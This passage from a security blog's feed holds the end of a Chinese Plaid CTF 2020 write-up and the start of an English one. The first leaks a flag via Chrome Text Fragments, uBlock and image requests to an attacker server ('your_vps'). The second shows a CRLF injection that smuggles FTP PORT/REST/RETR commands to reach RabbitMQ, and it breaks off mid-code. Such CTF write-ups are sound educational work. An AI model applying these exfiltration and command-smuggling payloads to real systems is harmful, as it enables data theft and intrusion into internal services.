true&#xFF0C;&#x6E05;&#x9664;&#x4E86; fragment &#x8DEF;&#x7531;&#x5F53;&#x4E2D;&#x7684;&#x8BA1;&#x65F6;&#x5668;&#xFF0C;&#x89E3;&#x9501; fragment &#x9501;&#xFF0C;&#x6B64;&#x65F6; iframe &#x5F53;&#x4E2D;&#x7684; issue_1 &#x754C;&#x9762;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x5168;&#x90E8;&#x52A0;&#x8F7D;&#xFF0C;&#x5E76;&#x56E0;&#x4E3A;<code>&lt;meta&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x4F5C;&#x7528;&#x8DF3;&#x8F6C;&#x5230;&#x4E86;&#x5305;&#x542B;&#x6709; FLAG &#x5E76;&#x4E14;&#x6709; Text Fragemnt &#x529F;&#x80FD;&#x7684;&#x9875;&#x9762;</p></li><li><p>&#x6B64;&#x65F6; FLAG &#x9875;&#x9762;&#x8FD8;&#x662F; admin session &#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;&#x4E0A;&#x4E00;&#x8F6E;&#x6211;&#x4EEC;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x7684; HTML &#x5143;&#x7D20;&#x4E5F;&#x5C31;&#x662F;&#x6CE8;&#x5165;&#x4E86;&#x5F88;&#x591A;<code>&lt;br&gt;</code>&#x6807;&#x7B7E;&#x7684;&#x5143;&#x7D20;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5C06; FLAG &#x6324;&#x51FA;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x754C;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x7531;&#x4E8E; uBlock &#x4F20;&#x9012;&#x4E86; User Activation &#x6FC0;&#x6D3B;&#x4E86; Text Fragment &#x529F;&#x80FD;&#xFF0C;&#x5C06;&#x4F1A;&#x5728;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x5339;&#x914D; FLAG &#x5B57;&#x7B26;</p></li><li><p>&#x4E00;&#x52A0;&#x8F7D;&#x5B8C;&#x754C;&#x9762;&#x9996;&#x5148;&#x4F1A;&#x56E0;&#x4E3A;<code>&lt;img src=&quot;http://your_vps/injection&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; injection &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x6709;&#x4E00;&#x4E2A; 1s &#x5EF6;&#x65F6;&#x7B49;&#x5F85;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B49;&#x5F85;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x7B49;&#x5F85; Text Fragments &#x662F;&#x5426;&#x5339;&#x914D;&#x5230; FLAG&#x7684;&#x5224;&#x65AD;</p></li><li><p>&#x5982;&#x679C; Text Fragments &#x5339;&#x914D;&#x5230;&#x4E86;&#xFF0C;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x6EDA;&#x52A8;&#xFF0C;&#x7528;&#x6237;&#x89C6;&#x7A97;&#x6EDA;&#x52A8;&#x5230; FLAG &#x5904;&#xFF0C;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;<code>&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; exfiltrated &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x5C06; match &#x8BBE;&#x7F6E;&#x4E3A; true &#xFF0C;&#x8BA9; injection &#x5B8C;&#x6210;&#x6211;&#x4EEC;&#x7684;&#x5224;&#x65AD;&#x56DE;&#x663E;&#x3002;</p></li></ol><p>&#x6574;&#x4E2A;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5927;&#x81F4;&#x5C31;&#x8FD9;&#x6837;&#xFF0C;&#x56FE;&#x5C31;&#x61D2;&#x5F97;&#x753B;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x4EE5;&#x53CA; wrtieup &#x8017;&#x8D39;&#x4E86;&#x6211;&#x4E0D;&#x5C11;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x6280;&#x672F;&#x90FD;&#x5206;&#x6790;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x91CD;&#x590D; leak FLAG &#x4E86;&#x3002;&#xFF08;&#x95EE;&#x4E86;&#x4F5C;&#x8005;&#xFF0C;FLAG &#x4E00;&#x5171; 38 &#x4F4D;&#x2026;</p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>&#x8FD9;&#x91CC;&#x5199;&#x4E00;&#x70B9;&#x9898;&#x5916;&#x8BDD;</p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>&#x5173;&#x4E8E; uBlock &#x4F7F;&#x7528; <code>postMessage</code> &#x590D;&#x5236; User Activation &#x7684;&#x65B9;&#x6CD5;&#x6211;&#x4ECD;&#x7136;&#x8868;&#x793A;&#x5B58;&#x7591;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x5DF1;&#x6839;&#x636E;&#x9605;&#x8BFB;&#x7684;&#x6587;&#x6863;&#xFF0C;<code>postMessage</code>&#x4F20;&#x9012; User Activation &#x9700;&#x8981;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.parent.postMessage(<span class="hljs-string">&apos;resize&apos;</span>, {<span class="hljs-attr">includeUserActivation</span>: <span class="hljs-literal">true</span>});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5728; uBlock &#x770B;&#x5230;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;&#xFF0C;<code>postMessage</code>&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x4E8E;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6211;&#x4E5F;&#x67E5;&#x770B;&#x4E86;&#x90E8;&#x5206; Chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E; UserActivation &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x662F; false &#x7684;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png" alt></p><p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x901A;&#x8FC7; <a href="#Verification">Verification</a> &#x73AF;&#x8282;&#x6D4B;&#x8BD5;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x786E;&#x5B9E;&#x9700;&#x8981; uBlock &#x6765;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x591A;&#xFF0C;&#x6700;&#x8FD1;&#x82B1;&#x592A;&#x591A;&#x65F6;&#x95F4;&#x5728;&#x8FD9;&#x9898;&#x7684;&#x590D;&#x76D8;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x6700;&#x8FD1;&#x4E0D;&#x6253;&#x7B97;&#x518D;&#x6DF1;&#x7A76;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x4EC5;&#x6D89;&#x53CA;&#x5230; User Activation &#xFF0C;&#x8FD8;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E9B;&#x5173;&#x4E8E; User Activation &#x62BD;&#x8C61;&#x6A21;&#x578B;&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x6DF1;&#x7A76;&#x7684;&#x8BDD;&#x5C31;&#x9700;&#x8981;&#x82B1;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x95F4;&#x4E86;&#x3002;</p><h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>&#x81F3;&#x4E8E;&#x9A8C;&#x8BC1;&#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x9700;&#x8981; uBlock &#x6765;&#x53C2;&#x4E0E;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x9A8C;&#x8BC1;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5C31;&#x662F;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5185;&#x5BB9;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7684; FLAG&#xFF0C;&#x6BD4;&#x5982; PCTF{TEST} &#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x8DDF; EXP &#x8FC7;&#x7A0B;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x628A; FLAG &#x7684;&#x5730;&#x5740;&#x6362;&#x4E3A;&#x81EA;&#x5DF1;&#x6D4B;&#x8BD5; FLAG &#x7684;&#x5730;&#x5740;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<strong>&#x5173;&#x95ED; Chrome &#x62D3;&#x5C55; uBlock</strong> &#x6765;&#x6D4B;&#x4E00;&#x904D;&#xFF08;&#x6700;&#x597D;&#x662F;&#x4ECE; Chrome &#x62D3;&#x5C55;&#x5173;&#x95ED;&#xFF0C;&#x4F7F;&#x7528;&#x62D3;&#x5C55;&#x672C;&#x8EAB;&#x7684;&#x5173;&#x95ED;&#x5E76;&#x4E0D;&#x662F;&#x5168;&#x7AD9;&#x5173;&#x95ED;&#xFF09;&#xFF0C;&#x591A;&#x6D4B;&#x8BD5;&#x51E0;&#x6B21;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x5F15;&#x5165; uBlock &#x6765;&#x5B9E;&#x73B0; Leak Data &#x3002;</p><h3 id="Text-Fragment"><a href="#Text-Fragment" class="headerlink" title="Text Fragment"></a>Text Fragment</h3><p>&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BD4;&#x8F83;&#x53EF;&#x60DC;&#x7684;&#x662F; @wupco &#x5E08;&#x5085;&#xFF0C;&#x4ED6;&#x4E4B;&#x524D;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x8FD9;&#x4E2A; chrome Text Fragment &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x5F15;&#x8D77;&#x4E86;&#x4ED6;&#x7684;&#x6CE8;&#x610F;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=flag{this_is_a_flag}</code>&#x7684;&#x5F62;&#x5F0F; leak data &#xFF0C;&#x53EF;&#x60DC;&#x4ED6;&#x8868;&#x793A;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x60F3;&#x8D77;&#x6765;&#x3002;&#xFF08;&#x4E0D;&#x6127;&#x662F;&#x8001; CTFer &#xFF0C;&#x4E00;&#x5F00;&#x53E3;&#x5C31;&#x77E5;&#x9053;&#x662F;&#x8001; CTFer &#x4E86;</p><blockquote><p>&#x200B;    How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?</p></blockquote><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/wupco1996/status/1226938811147522060" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script><h3 id="Other-Web-Challanges"><a href="#Other-Web-Challanges" class="headerlink" title="Other Web Challanges"></a>Other Web Challanges</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684; Web &#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;<a href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">Contrived Web Problem</a> &#x662F;&#x4E00;&#x9053; FTP &#x5230; SSRF &#x7684;&#x5229;&#x7528;&#x94FE;&#xFF0C;wp &#x53EF;&#x4EE5;&#x770B;&#x6211;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x82F1;&#x6587;&#x90E8;&#x5206;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x7684; payload &#xFF0C;&#x53EA;&#x804A;&#x4E86;&#x804A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x800C;&#x4E14;&#x82F1;&#x6587;&#x6C34;&#x5E73;&#x53EF;&#x80FD;&#x6BD4;&#x8F83;&#x62D9;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4EE5;&#x540E;&#x81EA;&#x5DF1;&#x6709;&#x6CA1;&#x6709;&#x7A7A;&#x5199;&#x4E2D;&#x6587;&#x7684;&#xFF0C;&#x81EA;&#x5DF1;&#x4E5F;&#x4E0D;&#x592A;&#x786E;&#x5B9A;&#x3002; Mooz Chat &#x542C; @wupco &#x5E08;&#x5085;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684; web &#x9898;&#xFF0C;&#xFF08;&#x592A;&#x5F3A;&#x5927;&#x4E86;&#xFF0C;&#x9700;&#x8981;&#x9006;&#x5411;&#xFF0C;&#x8868;&#x793A;&#x5355;&#x51ED;&#x81EA;&#x5DF1;&#x5F04;&#x4E0D;&#x4E86;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684;&#x9898;&#x76EE;&#x786E;&#x5B9E;&#x4EE4;&#x4EBA;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#xFF01;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#x6216;&#x8005; wp &#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x4EA4;&#x6D41;&#xFF01;</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x504F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x6211;&#x90FD;&#x89C9;&#x5F97;&#x975E;&#x5E38;&#x597D;&#x73A9;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x4E8E;&#x4F20;&#x7EDF;&#x7684; Web &#x653B;&#x51FB;&#xFF0C;&#x8FD8;&#x901A;&#x5E38;&#x5F15;&#x5165;&#x4E86;&#x5F88;&#x591A;&#x6BD4;&#x8F83;&#x65B0;&#x7684;&#x7406;&#x5FF5;&#x4E0E;&#x653B;&#x51FB;&#x94FE;&#xFF0C;&#x867D;&#x7136; User Activation &#x76F8;&#x5173;&#x7684;&#x90E8;&#x5206;&#x8FD8;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x5F04;&#x660E;&#x767D;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x9898;&#x4F5C;&#x8005;&#x8FD8;&#x662F;&#x6545;&#x610F;&#x5F15;&#x5165;&#x7684; uBlock &#x6765;&#x534F;&#x52A9;&#x6211;&#x4EEC;&#x505A;&#x9898;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x7684;&#x53CB;&#x597D;&#x4E86;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x53EF;&#x80FD;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x5B8C;&#x5168; Get &#x5230;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x70B9;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x5BF9;&#x6211;&#x800C;&#x8A00;&#x66F4;&#x8BA9;&#x4EBA;&#x89C9;&#x5F97;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#x7684;&#x662F; Chrome &#x65B0;&#x7279;&#x6027; Text Fragemnts &#xFF0C;&#x8BA9;&#x4EBA;&#x7814;&#x7A76;&#x7684;&#x66F4;&#x591A;&#x7684;&#x662F; User Activation &#x3002;</p><p>&#x867D;&#x7136;&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x5BF9;&#x4E8E;&#x5B9E;&#x6218;&#x53EF;&#x80FD;&#x663E;&#x5F97;&#x9E21;&#x808B;&#xFF0C;&#x751A;&#x81F3;&#x201C;&#x6BEB;&#x65E0;&#x4F5C;&#x7528;&#x201D;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#x6211;&#x89C9;&#x5F97;&#x6253;&#x5F00;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x89C6;&#x91CE;&#xFF0C;&#x8BA9;&#x6211;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x66F4;&#x591A;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x5728;&#x56FD;&#x5185;&#x8FD8;&#x662F;&#x5F88;&#x5C11;&#x89C1;&#x5230;&#x7684;&#xFF0C;&#x6BD5;&#x7ADF;&#x5F04;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#xFF0C;&#x4ECE;&#x4E3B;&#x8981;&#x653B;&#x51FB;&#x94FE;&#x6784;&#x9020;&#x5230;&#x7EC6;&#x8282;&#x8BBE;&#x7F6E;&#x90FD;&#x9700;&#x8981;&#x7CBE;&#x5FC3;&#x7684;&#x63E3;&#x6469;&#x4E0E;&#x63A8;&#x6572;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x662F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6CA1;&#x6709;&#x6DF1;&#x539A;&#x7684;&#x6280;&#x672F;&#x79EF;&#x6DC0;&#x51FA;&#x4E0D;&#x6765;&#x8FD9;&#x7C7B;&#x8BA9;&#x5168;&#x7403;&#x5927;&#x90E8;&#x5206; CTFer &#x7206;&#x96F6;&#x7684;&#x9AD8;&#x96BE;&#x5EA6;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x4E5F;&#x5E0C;&#x671B;&#x56FD;&#x5185;&#x4EE5;&#x540E;&#x80FD;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x8FD9;&#x7C7B;&#x9AD8;&#x8D28;&#x91CF;&#x7684;&#x9898;&#x76EE;&#x5427;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a></p><p><a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a></p><p><a href="https://developers.google.com/web/updates/2019/01/user-activation" target="_blank" rel="noopener">Making user activation consistent across APIs</a></p><p><a href="https://docs.google.com/document/d/1mcxB5J_u370juJhSsmK0XQONG2CIE3mvu827O-Knw_Y/edit#heading=h.hy5wkxbrpq6o" target="_blank" rel="noopener">Existing Chrome APIs using user gestures</a></p><p><a href="https://github.com/dtapuska/useractivation" target="_blank" rel="noopener">JS API for querying User Activation</a></p><p><a href="https://mustaqahmed.github.io/user-activation-delegation/" target="_blank" rel="noopener">Activation Transfer through postMessages</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zeddâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</id>
        <title><![CDATA[Plaid CTF 2020 Contrived Web Problem Write Up]]></title>
        <updated>2020-05-05T17:31:59+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"><![CDATA[<html><head></head><body><p>Here is my write up of Contrived Web Problem in Plaid CTF 2020.</p><a id="more"></a><p>[TOC]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>You can get the attachment of the chall in this <a href="https://github.com/ZeddYu/Plaid-CTF-2020-Web" target="_blank" rel="noopener">repo</a>.</p><ol><li>You can find CRLF in ftp then use CRLF to inject ftp command.</li><li>You can use PORT command to build a TCP connection with rabbitmq server.</li><li>Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api.</li><li>Hide this HTTP message in a PNG. Upload the picture as your profile.</li><li>Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server.</li><li>Check FLAG in your email.</li></ol><h2 id="CRLF-in-FTP"><a href="#CRLF-in-FTP" class="headerlink" title="CRLF in FTP"></a>CRLF in FTP</h2><p>We guess there should be a CRLF in FTP at first. And use <code>%250d%250a</code> to test it because it use the following code.</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">&quot;ftp:&quot;</span>) {</span><br><span class="line">  <span class="hljs-keyword">let</span> username = <span class="hljs-built_in">decodeURIComponent</span>(parsed.username);</span><br><span class="line">  <span class="hljs-keyword">let</span> password = <span class="hljs-built_in">decodeURIComponent</span>(parsed.password);</span><br><span class="line">  <span class="hljs-keyword">let</span> filename = <span class="hljs-built_in">decodeURIComponent</span>(parsed.pathname);</span><br><span class="line">  <span class="hljs-keyword">let</span> ftpClient = <span class="hljs-keyword">await</span> connectFtp({</span><br><span class="line">    host: parsed.hostname,</span><br><span class="line">    port: parsed.port !== <span class="hljs-string">&quot;&quot;</span> ? <span class="hljs-built_in">parseInt</span>(parsed.port) : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    user: username !== <span class="hljs-string">&quot;&quot;</span> ? username : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    password: password !== <span class="hljs-string">&quot;&quot;</span> ? password : <span class="hljs-literal">undefined</span>,</span><br><span class="line">  });</span><br><span class="line">  image = <span class="hljs-keyword">await</span> ftpClient.get(filename);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Send this url through <code>api/image</code>.</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/image?url=ftp://<span class="hljs-number">2</span>:<span class="hljs-number">2</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aPORT<span class="hljs-symbol">%20172</span>,<span class="hljs-number">32</span>,<span class="hljs-number">56</span>,<span class="hljs-number">72</span>,<span class="hljs-number">61</span>,<span class="hljs-number">56</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aREST<span class="hljs-symbol">%206</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aRETR<span class="hljs-symbol">%20</span><span class="hljs-symbol">%252</span>fuser<span class="hljs-symbol">%252</span>fb<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-symbol">%252</span>fprofile<span class="hljs-symbol">%252</span>epng<span class="hljs-title">@ftp</span>:<span class="hljs-number">21</span>/user/b<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a/profile.png</span><br></pre></td></tr></tbody></table></figure><p></p><p>This url will make a request like this.</p><p><img src="/images/plaid-ctf/1.png" alt></p><p>So we get a CRLF now.</p><p>Or you can audit the code of ftp <a href="https://github.com/mscdex/node-ftp" target="_blank" rel="noopener">https://github.com/mscdex/node-ftp</a> then you can find it do nothing with CRLF.</p><h2 id="The-active-mode-of-FTP"><a href="#The-active-mode-of-FTP" class="headerlink" title="The active mode of FTP"></a>The active mode of FTP</h2><p>FTP have two modes, one is active and the other is passive.</p><blockquote><p>In <em>active</em> mode, the client establishes the command channel but the <em>server</em> is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.</p><p>In <em>passive</em> mode, the client establishes <em>both</em> channels. We already know it establishes the command channel in active mode and it does the same here.</p></blockquote><p>If we don&#x2019;t inject code through CRLF, we can get the FTP traffic like this:</p><p><img src="/images/plaid-ctf/2.png" alt></p><p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p><p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p><p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p><p><img src="/images/plaid-ctf/1.png" alt></p><p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can&#x2019;t get the response on your server. It&#x2019;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p><h2 id="The-mail-server"><a href="#The-mail-server" class="headerlink" title="The mail server"></a>The mail server</h2><p>And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.</p><p>I notice there is a function that use to reset user&#x2019;s password.</p><p>services/api/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="hljs-string">&quot;/password-reset&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">let</span> { email } = req.body;</span><br><span 